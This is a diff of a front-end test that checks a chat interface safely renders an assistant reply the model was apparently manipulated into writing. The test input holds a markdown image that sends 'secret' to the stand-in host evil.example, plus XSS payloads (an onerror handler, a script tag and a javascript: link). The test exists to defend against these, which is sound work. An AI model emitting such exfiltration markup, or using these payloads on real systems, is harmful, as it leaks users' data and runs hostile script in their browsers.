@@ -231,7 +231,8 @@ test("a reply cannot load an image or run markup it was talked into writing", ()
   const reply = renderReply(
     "![chart](https://evil.example/p.png?q=secret)\n\n<img src=x onerror=alert(1)><script>alert(1)</script>\n\n[bad](javascript:alert(1))",
   );
-  expect(reply.querySelector("img, script")).toBeNull();
+  // Scoped to what was said: the avatar beside the reply is our own <img>.
+  expect(reply.querySelector(".prose img, .prose script")).toBeNull();
   const image = within(reply).getByRole("link", { name: /chart/ });
   expect(image).toHaveAttribute("href", "https://evil.example/p.png?q=secret");
   expect(within(reply).getByText("bad").closest("a")?.getAttribute("href") ?? "").not.toMatch(/^javascript:/i);
